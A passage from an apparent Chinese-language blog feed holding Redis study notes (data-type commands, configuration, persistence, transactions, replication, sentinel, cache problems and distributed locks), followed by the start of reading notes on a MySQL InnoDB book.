</span><br><span class="line">  hmset stu1002 id 1002 name lisi age 20</span><br><span class="line">d)批量获取指定哈希表中的field的值：hmget key field1 [field2 field3 ....]</span><br><span class="line">  hmget stu1001 id name age</span><br><span class="line">e)获取指定哈希表中所有的field和value：hgetall key</span><br><span class="line">  hgetall stu1002</span><br><span class="line">f)从指定哈希表中删除一个或者多个field：hdel key field1 [field2 field3 ....]</span><br><span class="line">  hdel stu1002 name age</span><br><span class="line">g)获取指定哈希表中所有的filed个数：hlen key</span><br><span class="line">  hlen stu1001</span><br><span class="line">  hlen stu1002</span><br><span class="line">h)判断指定哈希表中是否存在某一个field：hexists key field</span><br><span class="line">  hexists stu1001 name</span><br><span class="line">  hexists stu1002 name</span><br><span class="line">i)获取指定哈希表中所有的field列表：hkeys key</span><br><span class="line">  hkeys stu1001</span><br><span class="line">  hkeys stu1002</span><br><span class="line">j)获取指定哈希表中所有的value列表：hvals key</span><br><span class="line">  hvals stu1001</span><br><span class="line">  hvals stu1002</span><br><span class="line">k)对指定哈希表中指定field值进行整数加法运算：hincrby key field int</span><br><span class="line">  hincrby stu1001 age 5</span><br><span class="line">l)对指定哈希表中指定field值进行浮点数加法运算：hincrbyfloat key field float</span><br><span class="line">  hset stu1001 score 80.5</span><br><span class="line">  hincrbyfloat stu1001 score 5.5</span><br><span class="line">m)将一个field-vlaue对设置到哈希表中，当key-field已经存在时，则放弃设置；否则，设置file-value：hsetnx key field value</span><br><span class="line">  hsetnx stu1001 age 30</span><br></pre></td></tr></table></figure><p>   6)、redis中有关zset类型数据的操作命令：有序集合<br>                                            本质上是集合，所有元素不能重复；<br>                        每一个元素都关联一个分数，redis会根据分数对元素进行自动排序；<br>                        分数可以重复；<br>                        既然有序集合中每一个元素都有顺序，那么也都有下标；<br>                        有序集合中元素的排序规则又列表中元素的排序规则不一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a)将一个或者多个member及其score值加入有序集合：zadd key score member [score member ....]</span><br><span class="line">  *如果元素已经存在，则把分数覆盖</span><br><span class="line">  zadd zset01 20 z1 30 z2 50 z3 40 z4</span><br><span class="line">  zadd zset01 60 z2</span><br><span class="line">b)获取指定有序集合中指定下标区间的元素：zrange key startIndex endIndex [withscores]</span><br><span class="line">         zrange zset01 0 -1</span><br><span class="line">  zrange zset01 0 -1 withscores</span><br><span class="line">c)获取指定有序集合中指定分数区间(闭区间)的元素：zrangebyscore key min max [withscores]</span><br><span class="line">  zrangebyscore zset01 30 50 withscores</span><br><span class="line">       d)删除指定有序集合中一个或者多个元素：zrem key member [member......]</span><br><span class="line">  zrem zset01 z3 z4</span><br><span class="line">e)获取指定有序集合中所有元素的个数：zcard key</span><br><span class="line">  zcard zset01</span><br><span class="line">f)获取指定有序集合中分数在指定区间内的元素的个数：zcount key min max</span><br><span class="line">         zcount zset01 20 50</span><br><span class="line">g)获取指定有序集合中指定元素的排名(排名从0开始)： zrank key member</span><br><span class="line">  zrank zset01 z4  ===&gt;2</span><br><span class="line">h)获取指定有序集合中指定元素的分数：zscore key member</span><br><span class="line">  zscore zset01 z4</span><br><span class="line">i)获取指定有序集合中指定元素的排名(按照分数从大到小的排名):zrevrank key member</span><br><span class="line">  zrevrank zset01 z4  ===&gt;1</span><br></pre></td></tr></table></figure><h3 id="9、redis的配置文件："><a href="#9、redis的配置文件：" class="headerlink" title="9、redis的配置文件："></a>9、redis的配置文件：</h3><p>   redis安装完成之后，在redis的根目录会提供一个配置文件(redis.conf)；redis服务可以参考配置文件中的参数进行运行；只有启动redis服务器指定使用的配置文件，参数才会生效；否则，redis会采用默认的参数运行。</p><pre><code>1)、redis配置文件中关于网络的配置：    port：指定redis服务所使用的端口，默认使用6379。bind: 配置客户端连接redis服务时，所能使用的ip地址，默认可以使用redis服务所在主机上任何一个ip都可以;一般情况下，都会配置一个ip，而且通常是一个真实。             如果配置了port和bind，则客户端连接redis服务时，必须指定端口和ip：         redis-cli -h 192.168.11.128 -p 6380     redis-cli -h 192.168.11.128 -p 6380 shutdowntcp-keepalive:连接保活策略。2)、常规配置：    loglevel:配置日志级别,开发阶段配置debug,上线阶段配置notice或者warning.logfile：指定日志文件。redis在运行过程中，会输出一些日志信息；默认情况下，这些日志信息会输出到控制台；我们可以使用logfile配置日志文件，使redis把日志信息输出到指定文件中。    databases：配置redis服务默认创建的数据库实例个数，默认值是16。3)、安全配置：    requirepass：设置访问redis服务时所使用的密码；默认不使用。此参数必须在protected-mode=yes时才起作用。    一旦设置了密码验证，客户端连接redis服务时，必须使用密码连接：redis-cli -h ip -p port -a pwd</code></pre><h3 id="10、redis的持久化"><a href="#10、redis的持久化" class="headerlink" title="10、redis的持久化"></a>10、redis的持久化</h3><p>redis提供持久化策略，在适当的时机采用适当手段把内存中的数据持久化到磁盘中，每次redis服务启动时，都可以把磁盘上的数据再次加载内存中使用。<br>   1、RDB策略：在指定时间间隔内，redis服务执行指定次数的写操作，会自动触发一次持久化操作。<br>               RDB策略是redis默认的持久化策略，redis服务开启时这种持久化策略就已经默认开启了。</p><pre><code>       save &lt;seconds&gt; &lt;changes&gt;：配置持久化策略       dbfilename：配置redis RDB持久化数据存储的文件       dir:    配置redis RDB持久化文件所在目录</code></pre><p>   2、AOF策略：采用操作日志来记录进行每一次写操作，每次redis服务启动时，都会重新执行一遍操作日志中的指令。<br>               效率低下，redis默认不开启AOF功能。</p><pre><code>       appendonly:配置是否开启AOF策略       appendfilename：配置操作日志文件小结：根据数据的特点决定开启哪种持久化策略；      一般情况，开启RDB足够了。 </code></pre><h3 id="11、Redis的事务："><a href="#11、Redis的事务：" class="headerlink" title="11、Redis的事务："></a>11、Redis的事务：</h3><pre><code>事务：把一组数据库命令放在一起执行，保证操作原子性，要么同时成功，要么同时失败。Redis的事务：允许把一组redis命令放在一起，把命令进行序列化，然后一起执行，保证部分原子性。1)multi：用来标记一个事务的开始。    multi  set k1 v1  set k2 v22)exec：用来执行事务队列中所有的命令。  exec3)redis的事务只能保证部分原子性：  a)如果一组命令中，有在压入事务队列过程中发生错误的命令，则本事务中所有的命令都不执行，能够保证事务的原子性。    multiset k3 v3seta kk vvset k4 v4exec  b)如果一组命令中，在压入队列过程中正常，但是在执行事务队列命令时发生了错误，则只会影响发生错误的命令，不会影响其它命令的执行，不能够保证事务的原子性。    multiset k3 v3incr k1set k4 v4exec4)discard：清除所有已经压入队列中的命令，并且结束整个事务。   multi   set k5 v5    set k6 v6   discard5)watch：监控某一个键，当事务在执行过程中，此键代码的值发生变化，则本事务放弃执行；否则，正常执行。  id balance version  update table set balance=balance-dept,version=version+1  where id=xxxx and version=100  set balance 100  set balance2 1000  set version 1  watch version  multi  decrby balance 50  incrby balance2 50  exec 6)unwatch：放弃监控所有的键。   watch version   unwach   multi   decrby balance 50   incrby balance2 50   exec</code></pre><h3 id="12、redis消息的发布与订阅："><a href="#12、redis消息的发布与订阅：" class="headerlink" title="12、redis消息的发布与订阅："></a>12、redis消息的发布与订阅：</h3><p>   redis客户端订阅频道，消息的发布者往频道上发布消息，所有订阅此频道的客户端都能够接受到消息。<br>    1)subscribe：订阅一个或者多个频道的消息。<br>      subscribe ch1 ch2 ch3<br>    2)publish：将消息发布到指定频道<br>      publish ch1 hello<br>    3)psubcribe：订阅一个或者多个频道的消息，频道名支持通配符。<br>      subscribe news.*<br>      activeMQ2</p><h3 id="13、redis的主从复制"><a href="#13、redis的主从复制" class="headerlink" title="13、redis的主从复制"></a>13、redis的主从复制</h3><p>主少从多、主写从读、读写分离、主写同步复制到从。<br>   搭建一主二从redis集群：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">  1)、搭建三台redis服务：使用一个redis模拟三台redis服务</span><br><span class="line">      提供三分redis配置文件：redis6379.conf、redis6380.conf、redis6381.conf</span><br><span class="line">          修改三份配置文件:以redis6379.conf为例</span><br><span class="line">         bind 127.0.0.1</span><br><span class="line">         port 6379</span><br><span class="line">         pidfile /var/run/redis_6379.pid</span><br><span class="line"> logfile &quot;6379.log&quot;</span><br><span class="line"> dbfilename dump6379.rdb</span><br><span class="line">     分别使用三个redis配置文件，启动三个redis服务：</span><br><span class="line">          redis-server redis6379.conf &amp;</span><br><span class="line">   redis-server redis6380.conf &amp;</span><br><span class="line">   redis-server redis6381.conf &amp;</span><br><span class="line">  2)通过redis客户端分别连接三台redis服务：</span><br><span class="line">       redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">redis-cli -h 127.0.0.1 -p 6380</span><br><span class="line">redis-cli -h 127.0.0.1 -p 6381</span><br><span class="line">  3)查看三台redis服务在集群中的主从角色：</span><br><span class="line">       info replication</span><br><span class="line">默认情况下，所有的redis服务都是主机，即都能写和读，但是都还没有从机。</span><br><span class="line">  4)先在6379进行写操作：</span><br><span class="line">       set k1 v1</span><br><span class="line">    三台rdis服务互相独立，互不影响。</span><br><span class="line">  5)设置主从关系：设从不设主</span><br><span class="line">    在6380上执行：slaveof 127.0.0.1 6379</span><br><span class="line">    在6381上执行：slaveof 127.0.0.1 6379</span><br><span class="line">  6)全量复制：一旦主从关系确定，会自动把主库上已有的数据同步复制到从库。 </span><br><span class="line">    在6380和6381上执行：keys *</span><br><span class="line">  7)增量复制：主库写数据会自动同步到从库。</span><br><span class="line">    在6379上执行：set k2 v2</span><br><span class="line">    在6380和6381上执行：keys *</span><br><span class="line">  8)主写从读，读写分离： </span><br><span class="line">    在6380和6381上执行：set k3 v3  ===&gt;报错</span><br><span class="line">  9)主机宕机、从机原地待命:</span><br><span class="line">    关闭6379服务：redis-cli -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line"></span><br><span class="line">    查看6380和6381服务的主从角色：info replication</span><br><span class="line">  10)、主机恢复、一切恢复正常：</span><br><span class="line">    重启6379服务：redis-server redis6379.conf &amp;</span><br><span class="line">    客户端连接6379：redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">  11)、从机宕机、主机少一个从机、其它从机不变：</span><br><span class="line">    关闭6380服务： redis-cli -h 127.0.0.1 -p 6380 shutdown</span><br><span class="line"></span><br><span class="line">    查看6379服务的主从角色：info replication</span><br><span class="line">    查看6381服务的主从角色：info replication</span><br><span class="line">  12)、从机恢复、需要重新设置主从关系：</span><br><span class="line">    重启6380服务：redis-server redis6380.conf &amp;</span><br><span class="line">    客户端连接6380：redis-cli -h 127.0.0.1 -p 6380</span><br><span class="line">    </span><br><span class="line">    在6380上执行： slaveof 127.0.0.1 6379</span><br><span class="line">  13)、从机上位：</span><br><span class="line">    a)主机宕机、从机原地待命：</span><br><span class="line">      关闭6379服务：redis-cli -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line">      查看6380和6381服务的主从角色：info replication</span><br><span class="line">    b)从机断开原来主从关系：</span><br><span class="line">      在6380上执行：slaveof no one</span><br><span class="line">      查看6380服务的主从角色：info replication</span><br><span class="line">    c)重新设置主从关系：</span><br><span class="line">      在6381上执行：slaveof 127.0.0.1 6380</span><br><span class="line">    d)之前主机恢复、变成孤家寡人：</span><br><span class="line">      重启6379服务：redis-server redis6379.conf &amp;</span><br><span class="line">      客户端连接6379：redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">    e)天堂变地狱：</span><br><span class="line">      在6379上执行：slaveof 127.0.0.1 6381</span><br><span class="line">      在6381上执行：info replication   既是主机又是从机</span><br></pre></td></tr></table></figure><p>  小结：一台主机配置多台从机，一台从机又可以配置多台从机，从而形成一个庞大的集群架构。<br>        减轻一台主机的压力，但是增加了服务间的延迟时间。</p><h3 id="14、redis哨兵模式"><a href="#14、redis哨兵模式" class="headerlink" title="14、redis哨兵模式"></a>14、redis哨兵模式</h3><p>主机宕机、从机上位的自动版。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1)搭建一主二从集群架构：(17节前五步)</span><br><span class="line">2)提供哨兵配置文件：</span><br><span class="line">  在redis安装目下创建配置文件：redis_sentinel.conf</span><br><span class="line">  sentinel monitor dc-redis 127.0.0.1 6379 1</span><br><span class="line">3)启动哨兵服务：</span><br><span class="line">  redis-sentinel redis_sentinel.conf</span><br><span class="line">4)主机宕机：</span><br><span class="line">  关闭6379服务：redis-cli -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line">  哨兵程序自动选择从机上位。</span><br><span class="line">5)之前主机恢复：自动从属于新的主机。</span><br><span class="line">  重启6379服务：redis-server redis6379.conf &amp;</span><br><span class="line">  客户端连接6379：redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure><h3 id="15、jedis"><a href="#15、jedis" class="headerlink" title="15、jedis"></a>15、jedis</h3><p>jedis是redis官方提供的操作redis数据的技术。<br>                         把所有的redis指令都定义成java工具类的方法，方法名和redis的指令名完全一样；<br>             开发通过程序访问redis，只需要使用工具类及其方法即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  在java程序中访问redis：</span><br><span class="line">     1)创建maven版的java工程</span><br><span class="line">     2)添加jedis依赖</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">          &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">      &lt;/dependency&gt;</span><br><span class="line">     3)创建Jedis连接</span><br><span class="line">*关闭linux的防火墙</span><br></pre></td></tr></table></figure><h3 id="redission"><a href="#redission" class="headerlink" title="redission"></a>redission</h3><p>Redisson 是一个基于 Redis 的分布式 Java 对象存储框架，它提供了一套丰富的功能，用于在 Java 中操作 Redis 数据结构，并支持分布式锁、分布式集合、分布式对象等。</p><p>下面是 Redisson 提供的一些主要特性：</p><p>分布式对象： Redisson 提供了分布式对象，如分布式 Map、分布式 List、分布式 Set 等，使得在分布式环境下能够方便地操作这些数据结构。</p><p>分布式锁： Redisson 实现了基于 Redis 的分布式锁，支持可重入锁、公平锁、联锁等不同类型的锁，并提供了简单的 API 来使用这些锁。</p><p>分布式集合： Redisson 提供了一系列分布式集合，如分布式队列、分布式阻塞队列、分布式延迟队列等，以支持在分布式系统中进行异步任务处理。</p><p>分布式信号量、计数器和比较器： 提供了分布式信号量、计数器和比较器等功能，方便在分布式系统中协调和控制。</p><p>分布式 Pub&#x2F;Sub： Redisson 实现了分布式发布&#x2F;订阅模式，用于在不同的 JVM 中进行消息传递。</p><p>Spring Cache 支持： Redisson 提供了对 Spring Cache 的支持，可以方便地将缓存数据存储在 Redis 中。</p><p>多数据源支持： 支持连接多个 Redis 数据库，可以在一个应用中同时连接多个 Redis 集群。</p><p>可插拔的编解码器： Redisson 支持多种序列化方式，包括 JSON、Smile、MsgPack 等。</p><h3 id="Redis应用问题"><a href="#Redis应用问题" class="headerlink" title="Redis应用问题"></a>Redis应用问题</h3><h4 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h4><p>问题描述<br>key 对应的数据在数据源并不存在，每次针对此 key 的请求从缓存获取不到，请求都会压到数据源（数据库），从而可能压垮数据源。比如</p><p>用一个不存在的用户 id 获取用户信息，不论缓存还是数据库都没有，若黑客利用此漏洞进行攻击可能压垮数据库。</p><p>缓存穿透发生的条件：</p><p>应用服务器压力变大<br>redis 命中率降低<br>一直查询数据库，使得数据库压力太大而压垮</p><p>其实 redis 在这个过程中一直平稳运行，崩溃的是我们的数据库（如 MySQL）。</p><p>缓存穿透发生的原因：黑客或者其他非正常用户频繁进行很多非正常的 url 访问，使得 redis 查询不到数据库。</p><p>解决方案<br>对空值缓存：如果一个查询返回的数据为空（不管是数据是否不存在），我们仍然把这个空结果（null）进行缓存，设置空结果的过期时间会很短，最长不超过五分钟。</p><p>设置可访问的名单（白名单）：使用 bitmaps 类型定义一个可以访问的名单，名单 id 作为 bitmaps 的偏移量，每次访问和 bitmap 里面的 id 进行比较，如果访问 id 不在 bitmaps 里面，进行拦截，不允许访问。</p><p>采用布隆过滤器：布隆过滤器（Bloom Filter）是 1970 年由布隆提出的。它实际上是一个很长的二进制向量 (位图) 和一系列随机映射函数（哈希函数）。布隆过滤器可以用于检索一个元素是否在一个集合中。它的优点是空间效率和查询时间都远远超过一般的算法，缺点是有一定的误识别率和删除困难。</p><p>进行实时监控：当发现 Redis 的命中率开始急速降低，需要排查访问对象和访问的数据，和运维人员配合，可以设置黑名单限制服务。</p><h4 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h4><p>问题描述<br>key 对应的数据存在，但在 redis 中过期，此时若有大量并发请求过来，这些请求发现缓存过期一般都会从后端数据库加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端数据库压垮。</p><p>缓存击穿的现象：<br>数据库访问压力瞬时增加，数据库崩溃<br>redis 里面没有出现大量 key 过期<br>redis 正常运行</p><p>缓存击穿发生的原因：redis 某个 key 过期了，大量访问使用这个 key（热门 key）。</p><p>解决方案<br>key 可能会在某些时间点被超高并发地访问，是一种非常 “热点” 的数据。</p><p>预先设置热门数据：在 redis 高峰访问之前，把一些热门数据提前存入到 redis 里面，加大这些热门数据 key 的时长。</p><p>实时调整：现场监控哪些数据热门，实时调整 key 的过期时长。</p><p>使用锁：<br>就是在缓存失效的时候（判断拿出来的值为空），不是立即去 load db。<br>先使用缓存工具的某些带成功操作返回值的操作（比如 Redis 的 SETNX）去 set 一个 mutex key。<br>当操作返回成功时，再进行 load db 的操作，并回设缓存，最后删除 mutex key；<br>当操作返回失败，证明有线程在 load db，当前线程睡眠一段时间再重试整个 get 缓存的方法。</p><h4 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h4><p>问题描述<br>key 对应的数据存在，但在 redis 中过期，此时若有大量并发请求过来，这些请求发现缓存过期一般都会从后端数据库加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端数据库压垮。</p><p>缓存雪崩与缓存击穿的区别在于这里针对很多 key 缓存，前者则是某一个 key 正常访问。</p><p>缓存失效瞬间：</p><p>解决方案<br>构建多级缓存架构：nginx 缓存 + redis 缓存 + 其他缓存（ehcache 等）。</p><p>使用锁或队列：用加锁或者队列的方式来保证不会有大量的线程对数据库一次性进行读写，从而避免失效时大量的并发请求落到底层存储系统上，该方法不适用高并发情况。</p><p>设置过期标志更新缓存：记录缓存数据是否过期（设置提前量），如果过期会触发通知另外的线程在后台去更新实际 key 的缓存。</p><p>将缓存失效时间分散开：比如可以在原有的失效时间基础上增加一个随机值，比如 1-5 分钟随机，这样每一个缓存的过期时间的重复率就会降低，就很难引发集体失效的事件。</p><h4 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h4><p>问题描述<br>随着业务发展的需要，原单体单机部署的系统被演化成分布式集群系统后，由于分布式系统多线程的特点以及分布在不同机器上，这将使原单机部署情况下的并发控制锁策略失效，单纯的 Java API 并不能提供分布式锁的能力。为了解决这个问题就需要一种跨 JVM 的互斥机制来控制共享资源的访问，这就是分布式锁要解决的问题！</p><p>分布式锁主流的实现方案：</p><p>基于数据库实现分布式锁</p><p>基于缓存（Redis 等）</p><p>基于 Zookeeper</p><p>根据实现方式，分布式锁还可以分为类 CAS 自旋式分布式锁以及 event 事件类型分布式锁：</p><p>类 CAS 自旋式分布式锁：询问的方式，类似 java 并发编程中的线程获询问的方式尝试加锁，如 mysql、redis。<br>另外一类是 event 事件通知进程后续锁的变化，轮询向外的过程，如 zookeeper、etcd。<br>每一种分布式锁解决方案都有各自的优缺点：</p><p>性能：redis 最高</p><p>可靠性：zookeeper 最高</p><p>解决方案：使用 redis 实现分布式锁</p><p>setnx：通过该命令尝试获得锁，没有获得锁的线程会不断等待尝试。</p><p>set key ex 3000nx：设置过期时间，自动释放锁，解决当某一个业务异常而导致锁无法释放的问题。但是当业务运行超过过期时间时，开辟监控线程增加该业务的运行时间，直到运行结束，释放锁。</p><p>uuid：设置 uuid，释放前获取这个值，判断是否自己的锁，防止误删锁，造成没锁的情况。</p><p>RedLock<br>Redlock 是一种算法，Redlock 也就是 Redis Distributed Lock，可用实现多节点 redis 的分布式锁。RedLock 官方推荐，Redisson 完成了对 Redlock 算法封装。</p><p>此种方式具有以下特性：<br>互斥访问：即永远只有一个 client 能拿到锁。<br>避免死锁：最终 client 都可能拿到锁，不会出现死锁的情况，即使锁定资源的服务崩溃或者分区，仍然能释放锁。<br>容错性：只要大部分 Redis 节点存活（一半以上），就可以正常提供服务</p><p>RedLock 原理（了解）<br>获取当前 Unix 时间，以毫秒为单位。<br>依次尝试从 N 个实例，使用相同的 key 和随机值获取锁。在步骤 2，当向 Redis 设置锁时，客户端应该设置一个网络连接和响应超时时间，这个超时时间应该小于锁的失效时间。例如你的锁自动失效时间为 10 秒，则超时时间应该在 5-50 毫秒之间。这样可以避免服务器端 Redis 已经挂掉的情况下，客户端还在死死地等待响应结果。如果服务器端没有在规定时间内响应，客户端应该尽快尝试另外一个 Redis 实例。<br>客户端使用当前时间减去开始获取锁时间（步骤 1 记录的时间）就得到获取锁使用的时间。当且仅当从大多数（这里是 3 个节点）的 Redis 节点都取到锁，并且使用的时间小于锁失效时间时，锁才算获取成功。<br>如果取到了锁，key 的真正有效时间等于有效时间减去获取锁所使用的时间（步骤 3 计算的结果）。<br>如果因为某些原因，获取锁失败（没有在至少 N&#x2F;2+1 个 Redis 实例取到锁或者取锁时间已经超过了有效时间），客户端应该在所有的 Redis 实例上进行解锁（即便某些 Redis 实例根本就没有加锁成功）。</p><h4 id="LUA-脚本"><a href="#LUA-脚本" class="headerlink" title="LUA 脚本"></a>LUA 脚本</h4><p>将复杂的或者多步的 redis 操作，写为一个脚本，一次提交给 redis 执行，减少反复连接 redis 的次数，提升性能。</p><p>LUA 脚本是类似 redis 事务，有一定的原子性，不会被其他命令插队，可以完成一些 redis 事务性的操作。</p><p>但是注意 redis 的 lua 脚本功能，只有在 Redis 2.6 以上的版本才可以使用。</p><p>利用 lua 脚本淘汰用户，解决超卖问题，redis 2.6 版本以后，通过 lua 脚本解决争抢问题，实际上是 redis 利用其单线程的特性，用任务队列的方式解决多任务并发问题。</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
      <category>面经笔经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《MySQL内核 InnoDB存储引擎》笔记</title>
    <link href="/2023/06/18/%E3%80%8AMySQL%E5%86%85%E6%A0%B8%20InnoDB%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/06/18/%E3%80%8AMySQL%E5%86%85%E6%A0%B8%20InnoDB%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E3%80%8B%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从图书馆借了几本书，有工具类的，有知识类的，其中借了不少有关于数据库的书。这本《MySQL内核 InnoDB存储引擎》花了些时间过完了，个人感觉这本书很晦涩，里面介绍的东西很多，但是都是讲个大概就开始分析源码，想要真正全部看懂很困难，目前只是通读了一遍，对于其中一些比较有用的知识点进行记载。</p><p>学习存储引擎的时候出现了自己不太熟悉的概念：聚簇索引和非聚簇索引，其中内容感觉很多，发现了一篇博客对其记载的很好，进行记录<br><a href="https://www.jianshu.com/p/fa8192853184">https://www.jianshu.com/p/fa8192853184</a></p><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>InnoDB存储引擎支持事务，其设计目标主要面向在线事务处理(OLTP)的应用。其特点是行锁设计、支持外键，并支持非锁定读，即默认读操作不会产生锁。<br>InnoDB通过使用多版本并发控制(MVCC)来获取高并发性，并且实现了SQL标准的4种隔离级别，默认为REPEATABLE级别。同时，使用一种被称为next-key-locking的策略来避免幻读现象的产生。除此之外，InnoDB存储引擎还提供了插入缓冲(insert buffer)、二次写(double write)、自适应哈希索引(adaptive hash index)、预读(read ahead)等高性能和高可用的功能。</p><p>InnoDB存储引擎由内存池，后台线程和磁盘文件三大部分组成。</p><h2 id="缓冲池"><a href="#缓冲池" class="headerlink" title="缓冲池"></a>缓冲池</h2><p> InnoDB存储引擎是基于磁盘存储的，并将其中的记录按照页的方式进行管理。但是由于CPU速度和磁盘速度之间的鸿沟，基于磁盘的数据库系统通常使用缓冲池记录来提高数据库的的整体性能。</p><p> 在数据库中进行读取操作，首先将从磁盘中读到的页放在缓冲池中，下次再读相同的页中时，首先判断该页是否在缓冲池中。若在缓冲池中，称该页在缓冲池中被命中，直接读取该页。否则，读取磁盘上的页。</p><p> 对于数据库中页的修改操作，则首先修改在缓冲池中的页，然后再以一定的频率刷新到磁盘上。页从缓冲池刷新回磁盘的操作并不是在每次页发生更新时触发，而是通过一种称为CheckPoint的机制刷新回磁盘。</p><p> 所以，缓冲池的大小直接影响着数据库的整体性能，可以通过配置参数innodb_buffer_pool_size来设置。</p><p> 具体来看，缓冲池中缓存的数据页类型有：索引页、数据页、undo页（日志）、插入缓冲(insert buffer)、自适应哈希索引(adaptive hash index)、锁信息(lock info)和数据字典信息(data dictionary)。</p><p>InnoDB存储引擎的内存区域除了有缓冲池之外，还有重做日志缓冲和额外内存池。InnoDB存储引擎首先将重做日志信息先放到这个缓冲区中，然后按照一定频率将其刷新到重做日志文件中。重做日志缓冲一般不需要设置的很大，该值可由配置参数innodb_log_buffer_size控制。</p><h2 id="数据页和索引页"><a href="#数据页和索引页" class="headerlink" title="数据页和索引页"></a>数据页和索引页</h2><p> Page是Innodb存储的最基本结构，也是Innodb磁盘管理的最小单位，与数据库相关的所有内容都存储在Page结构里。在MySQL3.2.3版本中，InnoDB存储引擎仅定义了两种类型的页，索引页和undo日志页。由于InnoDB是索引组织表，故索引即数据，可以理解索引页也就是数据页。undo页用来存放unfo日志，其主要用来完成事务的回滚操作。此外undo页可以构造当前记录的前一个版本，因此undo日志还用来实现多版本并发控制的功能。<br>索引页在存储结构方面由Page Header和Page Directory组成。Page Header主要存储了Page Directory中槽的数量、堆中空闲空间的位置、堆中的记录数量、最后插入记录的位置等等。<br>Page Directory保存了页中关于记录的存储信息。若要进行记录的查询操作，则需要通过Page Directory。B+树查询记录只能查询到记录所在的页，而精确定位到记录在页中的位置则需要PageDirectory。<br>Page Directory由槽组成，每个槽占用2个字节，其指向的是记录在页中的偏移量，Page Directory中的槽根据指向记录的主键顺序逆序存放，因此通过二叉查找算法可以快速地定位到查询的记录。然而，为了提高存储以及插入的效率，InnoDB存储引擎对于槽的设计采用了稀疏方式。不是页中的每一个记录都对应槽，而是每个槽对应了一个记录，通过每个记录又包含一个四位的n_owned属性，记录这个槽中拥有的记录数量。每个槽总是包含4~8条记录，例外的情况是第一个槽仅包含1个记录，最后1个槽可包含1~8个记录。</p><h2 id="插入缓冲-Insert-Buffer"><a href="#插入缓冲-Insert-Buffer" class="headerlink" title="插入缓冲(Insert Buffer)"></a>插入缓冲(Insert Buffer)</h2><p> 